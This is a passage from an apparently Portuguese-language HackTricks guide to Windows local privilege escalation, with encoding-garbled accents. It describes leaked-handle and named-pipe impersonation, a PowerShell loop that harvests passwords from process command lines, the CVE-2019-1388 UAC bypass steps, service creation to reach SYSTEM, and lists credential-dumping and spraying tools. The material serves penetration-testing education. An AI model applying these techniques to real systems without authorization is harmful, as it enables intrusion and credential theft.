Imagine que **um processo rodando como SYSTEM abre um novo processo** (`OpenProcess()`) com **acesso total**. O mesmo processo **tamb√©m cria um novo processo** (`CreateProcess()`) **com privil√©gios baixos, mas herdando todos os manipuladores abertos do processo principal**.\
Ent√£o, se voc√™ tem **acesso total ao processo de baixo privil√©gio**, voc√™ pode pegar o **manipulador aberto para o processo privilegiado criado** com `OpenProcess()` e **injetar um shellcode**.\
[Leia este exemplo para mais informa√ß√µes sobre **como detectar e explorar essa vulnerabilidade**.](leaked-handle-exploitation.md)\
[Leia este **outro post para uma explica√ß√£o mais completa sobre como testar e abusar de mais manipuladores abertos de processos e threads herdados com diferentes n√≠veis de permiss√µes (n√£o apenas acesso total)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersona√ß√£o de Cliente de Named Pipe

Um `pipe` √© um bloco de mem√≥ria compartilhada que processos podem usar para comunica√ß√£o e troca de dados.

`Named Pipes` √© um mecanismo do Windows que permite que dois processos n√£o relacionados troquem dados entre si, mesmo que os processos estejam localizados em duas redes diferentes. √â muito semelhante √† arquitetura cliente/servidor, pois existem no√ß√µes como `um servidor de named pipe` e um `cliente de named pipe`.

Quando um **cliente escreve em um pipe**, o **servidor** que criou o pipe pode **impersonar** o **cliente** se tiver privil√©gios de **SeImpersonate**. Ent√£o, se voc√™ encontrar um **processo privilegiado que vai escrever em qualquer pipe que voc√™ possa impersonar**, voc√™ poderia ser capaz de **escalar privil√©gios** impersonando esse processo ap√≥s ele escrever dentro do seu pipe criado. [**Voc√™ pode ler isto para aprender como realizar este ataque**](named-pipe-client-impersonation.md) **ou** [**isto**](./#from-high-integrity-to-system)**.**

**Al√©m disso, a seguinte ferramenta permite interceptar uma comunica√ß√£o de named pipe com uma ferramenta como o burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e ver todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## Diversos

### **Monitorando Linhas de Comando para senhas**

Ao obter um shell como usu√°rio, pode haver tarefas agendadas ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura linhas de comando de processos a cada dois segundos e compara o estado atual com o estado anterior, exibindo quaisquer diferen√ßas.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## De Usu√°rio com Privil√©gios Baixos para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se voc√™ tem acesso √† interface gr√°fica (via console ou RDP) e o UAC est√° ativado, em algumas vers√µes do Microsoft Windows √© poss√≠vel executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usu√°rio n√£o privilegiado.

Isso torna poss√≠vel escalar privil√©gios e burlar o UAC ao mesmo tempo com a mesma vulnerabilidade. Al√©m disso, n√£o √© necess√°rio instalar nada e o bin√°rio utilizado durante o processo √© assinado e emitido pela Microsoft.

Alguns dos sistemas afetados s√£o os seguintes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explorar essa vulnerabilidade, √© necess√°rio realizar os seguintes passos:

```
1) Clique com o bot√£o direito no arquivo HHUPD.EXE e execute-o como Administrador.

2) Quando o prompt do UAC aparecer, selecione "Mostrar mais detalhes".

3) Clique em "Mostrar informa√ß√µes do certificado do publicador".

4) Se o sistema estiver vulner√°vel, ao clicar no link da URL "Emitido por", o navegador web padr√£o pode ser aberto.

5) Aguarde o site carregar completamente e selecione "Salvar como" para abrir uma janela do explorer.exe.

6) No caminho do endere√ßo da janela do explorer, insira cmd.exe, powershell.exe ou qualquer outro processo interativo.

7) Agora voc√™ ter√° um prompt de comando "NT\AUTHORITY SYSTEM".

8) Lembre-se de cancelar a configura√ß√£o e o prompt do UAC para retornar √† sua √°rea de trabalho.
```

Voc√™ tem todos os arquivos e informa√ß√µes necess√°rios no seguinte reposit√≥rio do GitHub:

https://github.com/jas502n/CVE-2019-1388

## De Administrador N√≠vel M√©dio para Alto N√≠vel de Integridade / Bypass do UAC

Leia isto para **aprender sobre N√≠veis de Integridade**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Em seguida, **leia isto para aprender sobre o UAC e bypasses do UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **De Alto N√≠vel de Integridade para Sistema**

### **Novo servi√ßo**

Se voc√™ j√° estiver executando em um processo de Alto N√≠vel de Integridade, a **passagem para SISTEMA** pode ser f√°cil apenas **criando e executando um novo servi√ßo**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

De um processo de Alta Integridade, voc√™ pode tentar **habilitar as entradas de registro AlwaysInstallElevated** e **instalar** um shell reverso usando um _**.msi**_ wrapper.\
[Mais informa√ß√µes sobre as chaves de registro envolvidas e como instalar um pacote _.msi_ aqui.](./#alwaysinstallelevated)

### Alta Integridade + Privil√©gio SeImpersonate para System

**Voc√™ pode** [**encontrar o c√≥digo aqui**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate para Privil√©gios Totais de Token

Se voc√™ possui esses privil√©gios de token (provavelmente encontrar√° isso em um processo j√° de Alta Integridade), voc√™ poder√° **abrir quase qualquer processo** (n√£o processos protegidos) com o privil√©gio SeDebug, **copiar o token** do processo e criar um **processo arbitr√°rio com esse token**.\
Usando esta t√©cnica, geralmente √© **selecionado qualquer processo em execu√ß√£o como SYSTEM com todos os privil√©gios de token** (_sim, voc√™ pode encontrar processos SYSTEM sem todos os privil√©gios de token_).\
**Voc√™ pode encontrar um** [**exemplo de c√≥digo executando a t√©cnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta t√©cnica √© usada pelo meterpreter para escalar em `getsystem`. A t√©cnica consiste em **criar um pipe e depois criar/abusar de um servi√ßo para escrever nesse pipe**. Ent√£o, o **servidor** que criou o pipe usando o privil√©gio **`SeImpersonate`** ser√° capaz de **impersonar o token** do cliente do pipe (o servi√ßo) obtendo privil√©gios de SYSTEM.\
Se voc√™ quiser [**saber mais sobre named pipes, voc√™ deve ler isto**](./#named-pipe-client-impersonation).\
Se voc√™ quiser ler um exemplo de [**como ir de alta integridade para System usando named pipes, voc√™ deve ler isto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se voc√™ conseguir **sequestrar uma dll** sendo **carregada** por um **processo** executando como **SYSTEM**, voc√™ ser√° capaz de executar c√≥digo arbitr√°rio com essas permiss√µes. Portanto, Dll Hijacking tamb√©m √© √∫til para este tipo de escalonamento de privil√©gios, e, al√©m disso, √© **muito mais f√°cil de alcan√ßar a partir de um processo de alta integridade** pois ter√° **permiss√µes de escrita** nas pastas usadas para carregar dlls.\
**Voc√™ pode** [**aprender mais sobre Dll hijacking aqui**](dll-hijacking.md)**.**

### **De Administrador ou Servi√ßo de Rede para System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### De LOCAL SERVICE ou NETWORK SERVICE para privil√©gios completos

**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mais ajuda

[Bin√°rios est√°ticos do impacket](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas √∫teis

**Melhor ferramenta para procurar vetores de escalonamento de privil√©gios locais do Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica configura√ß√µes incorretas e arquivos sens√≠veis (**[**verifique aqui**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica algumas poss√≠veis configura√ß√µes incorretas e coleta informa√ß√µes (**[**verifique aqui**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica configura√ß√µes incorretas**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informa√ß√µes de sess√µes salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough localmente.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai credenciais do Gerenciador de Credenciais. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Aplica senhas coletadas em todo o dom√≠nio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh √© uma ferramenta de spoofing e man-in-the-middle para ADIDNS/LLMNR/mDNS/NBNS no PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumera√ß√£o b√°sica de privesc do Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Procura por vulnerabilidades conhecidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verifica√ß√µes locais **(Necessita de direitos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura por vulnerabilidades conhecidas de privesc (precisa ser compilado usando VisualStudio) ([**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host procurando por configura√ß√µes incorretas (mais uma ferramenta de coleta de informa√ß√µes do que privesc) (precisa ser compilado) **(**[**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credenciais de v√°rios softwares (exe pr√©-compilado no github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port do PowerUp para C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Verifica configura√ß√µes incorretas (execut√°vel pr√©-compilado no github). N√£o recomendado. N√£o funciona bem no Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica poss√≠veis configura√ß√µes incorretas (exe do python). N√£o recomendado. N√£o funciona bem no Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ferramenta criada com base neste post (n√£o precisa do accesschk para funcionar corretamente, mas pode us√°-lo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- L√™ a sa√≠da do **systeminfo** e recomenda exploits funcionais (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- L√™ a sa√≠da do **systeminfo** e recomenda exploits funcionais (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Voc√™ tem que compilar o projeto usando a vers√£o correta do .NET ([veja isto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a vers√£o instalada do .NET no host v√≠tima, voc√™ pode fazer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
